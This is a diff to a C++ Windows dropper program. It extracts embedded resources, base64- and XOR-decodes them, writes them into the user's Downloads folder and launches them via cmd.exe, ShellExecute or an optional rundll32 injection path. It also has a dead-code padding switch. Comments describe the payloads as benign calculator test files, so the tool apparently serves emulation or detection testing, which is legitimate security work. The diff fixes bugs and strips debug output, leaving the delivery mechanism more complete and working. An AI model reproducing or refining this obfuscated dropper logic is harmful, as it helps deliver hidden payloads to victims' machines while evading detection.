@@ -52,11 +52,11 @@
 void dead();
 std::uint64_t check_version();
 void dropper_start(int);
-void drop(DWORD size, void* buffer, std::string);
+void drop(DWORD size, void* buffer, std::wstring);
 void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
-bool non_exe_launch(std::string);
-void exe_launch(std::string);
+bool non_exe_launch(std::wstring);
+void exe_launch(std::wstring);
 void set_name(std::uint64_t);
 void setup_name(std::uint64_t);
 
@@ -81,11 +81,11 @@ HMODULE h;
 // 3 payload.bat (copies calc.exe onto Downloads)
 // 4 7calc.exe (calculator for windows 7)
 
-std::string name1;
-std::string name2;
-std::string name3;
-std::string name4;
-std::string name5;
+std::wstring name1;
+std::wstring name2;
+std::wstring name3;
+std::wstring name4;
+std::wstring name5;
 
 HRSRC r1;
 HRSRC r2;
@@ -115,6 +115,8 @@ DWORD size5;
 int main(int argc, char* argv[])
 {
 
+	LoadLibraryW(L"mscoree.dll");
+
 	os_version = check_version();
 
 	setup_name(os_version);
@@ -137,8 +139,6 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 6) {
 #ifdef W7_EXTRACT
-
-		LoadLibraryW(L"mscoree.dll");
 
 		dropper_start(2);
 		dropper_start(3);
@@ -184,7 +184,6 @@ int main(int argc, char* argv[])
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
 		data4 = XOR(data4, size4);
 		data5 = XOR(data5, size5);
 	#endif
@@ -192,9 +191,7 @@ int main(int argc, char* argv[])
 		drop(size4, data4, name4);
 		drop(size5, data5, name5);
 
-		std::cout << "before launch";
 		exe_launch(name4);
-		std::cout << "after launch";
 
 #endif
 
@@ -214,31 +211,31 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-		dropper_start(3);
+//		dropper_start(3);
 		dropper_start(1);
 
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
-		size3 = size3 - 1;
-		data3 = base64decode(data3, &size3);
+//		size3 = size3 - 1;
+//		data3 = base64decode(data3, &size3);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
 		data1 = XOR(data1, size1);
-		data3 = XOR(data3, size3);
+//		data3 = XOR(data3, size3);
 	#endif
 
 		drop(size1, data1, name1);
-		drop(size3, data3, name3);
+//		drop(size3, data3, name3);
 
-		bool result = non_exe_launch(name3);
-		std::cout << "before exe_launch 2 " << std::endl;
-		if (result == true){
-			std::cout << "before exe_launch";
+//		bool result = non_exe_launch(name3);
+//		std::cout << "before exe_launch 2 " << std::endl;
+//		if (result == true){
+//			std::cout << "before exe_launch";
 			exe_launch(name1);
-		} else {
-			std::cout << "This failed and nothing happened.\n";
-		}
+//		} else {
+//			std::cout << "This failed and nothing happened.\n";
+//		}
 
 #ifdef DEAD_CODE
 		// dead code
@@ -281,25 +278,25 @@ void setup_name(std::uint64_t os_version) {
 	else if (os_version == 6){
 #ifdef W7_EXTRACT
 
-		const char* temp = std::getenv("USERPROFILE");
+		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
 			name2 += temp;
-			name2 += "\\Downloads";
+			name2 += L"\\Downloads";
 
 			name3 += temp;
-			name3 += "\\Downloads";
+			name3 += L"\\Downloads";
 		} else {
 			printf("Problem with userprofile");
 		}
 
 #else
 
-		const char* temp = std::getenv("USERPROFILE");
+		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
 			name4 += temp;
-			name4 += "\\Downloads";
+			name4 += L"\\Downloads";
 			name5 += temp;
-			name5 += "\\Downloads";
+			name5 += L"\\Downloads";
 
 		} else {
 			printf("Problem with userprofile");
@@ -309,13 +306,13 @@ void setup_name(std::uint64_t os_version) {
 	}
 	else if (os_version == 10){
 
-		const char* temp = std::getenv("USERPROFILE");
+		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
 			name1 += temp;
-			name1 += "\\Downloads";
+			name1 += L"\\Downloads";
 
 			name3 +=temp;
-			name3 += "\\Downloads";
+			name3 += L"\\Downloads";
 
 		} else {
 			printf("Problem with userprofile");
@@ -367,9 +364,15 @@ void set_name(std::uint64_t os_version)
 	#endif
 #else
 
-	name4+=DROPPER_OUTPUT;
-	name5+=DROPPER_OUTPUT;
-	name5+=".mui";
+	const char* drop = DROPPER_OUTPUT;
+	int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
+	std::wstring out(size, L'\0');
+	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
+
+	name1+=out.c_str();
+//	name4+=DROPPER_OUTPUT;
+//	name5+=DROPPER_OUTPUT;
+	//name5+=".mui";
 
 #endif
 	}
@@ -389,8 +392,13 @@ void set_name(std::uint64_t os_version)
 		}
 #else
 
-		name1+=DROPPER_OUTPUT;
-		name3+="\\file_move.bat";
+		const char* drop = DROPPER_OUTPUT;
+		int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
+		std::wstring out(size, L'\0');
+		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
+
+		name1+=out.c_str();
+		//name3+="\\file_move.bat";
 #endif
 	}
 
@@ -441,7 +449,7 @@ void dropper_start(int x){
 	}
 	if (x == 5){
 		//Locate Resource
-		r5 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
+		r5 = FindResource(h, MAKEINTRESOURCE(IDR_BIN5), MAKEINTRESOURCE(BIN));
 		// Load Resource
 		rc5 = LoadResource(h, r5);
 		// Ensure nobody else will handle it
@@ -452,8 +460,7 @@ void dropper_start(int x){
 
 }
 
-bool non_exe_launch(std::string name){
-	std::wstring ws(name.begin(), name.end());
+bool non_exe_launch(std::wstring name){
 	SHELLEXECUTEINFOW sei = {};
 	sei.cbSize = sizeof(sei);
 	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -490,16 +497,14 @@ bool non_exe_launch(std::string name){
 }
 
 // Launch a New Process based on the dropped file name
-void exe_launch(std::string run_exe)
+void exe_launch(std::wstring run_exe)
 {
-	run_exe = "C:\\Users\\Administrator\\file_get.exe";
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 	// build injection command
-	wchar_t cmd[] = L"/c C:\\Users\\Administrator\\Downloads\\file_get.exe";
 #ifdef INJECT
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
@@ -507,7 +512,7 @@ void exe_launch(std::string run_exe)
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	BOOL err = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	BOOL err = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", run_exe.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (err == 0) {
 		std::cout << "this failed.";
 		return false;
@@ -577,9 +582,9 @@ void* XOR(void* data, DWORD size) {
 }
 
 // Drop buffer to file
-void drop(DWORD size, void* buffer, std::string drop_name)
+void drop(DWORD size, void* buffer, std::wstring drop_name)
 {
-	FILE* f = fopen(drop_name.c_str(), "wb");
+	FILE* f = _wfopen(drop_name.c_str(), L"wb");
 	// traverse byte list
 	if (!f) {
 		perror("fopen");
@@ -592,7 +597,7 @@ void drop(DWORD size, void* buffer, std::string drop_name)
 			unsigned char c1 = ((unsigned char*)buffer)[i];
 
 			// drop byte to file
-			fprintf(f, "%c", c1);
+			fputc(c1, f);
 		}
 
 		// file fully written
